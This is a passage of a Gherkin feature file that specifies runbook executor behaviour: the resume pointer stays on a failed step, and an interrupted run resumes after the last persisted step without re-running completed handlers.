  # Why: Pointer integrity — the resume pointer never advances past a step that failed
  @task:TASK-RBX-004
  @edge-case
  Scenario: The resume pointer rests on the failed step after a failure
    Given a persisted runbook whose second step's handler fails
    When the executor runs the runbook
    Then the resume pointer should rest on the second step
    And re-running the runbook should resume at the second step

  # Why: Crash recovery — a run interrupted after a step commits resumes at the next step
  @task:TASK-RBX-004
  @edge-case
  Scenario: A run interrupted after a step completes resumes at the next step
    Given a persisted runbook whose first step completed and was persisted before the run was interrupted
    When the executor runs the runbook again
    Then the first step's handler should not run again
    And the run should resume at the second step

  # Why: Open-closed via the registry — a brand-new step type needs only a handler registered
